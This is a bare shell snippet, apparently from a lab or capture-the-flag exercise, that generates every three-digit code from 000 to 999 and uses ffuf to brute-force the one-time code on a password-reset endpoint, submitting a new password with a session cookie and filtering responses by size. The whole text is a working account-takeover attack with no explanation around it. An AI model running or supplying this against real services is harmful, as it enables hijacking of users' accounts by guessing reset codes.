for i in $(seq -w 000 999); do echo $i; done > otp-wordlist.txt

ffuf -c -u "http://172.18.0.1:5000/reset/confirm.php" -X POST -d "otp_input=FUZZ&new_password=pass123" -w otp-wordlist.txt -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=d91f5def3dee707a37248bb457aa04de" -fs 1743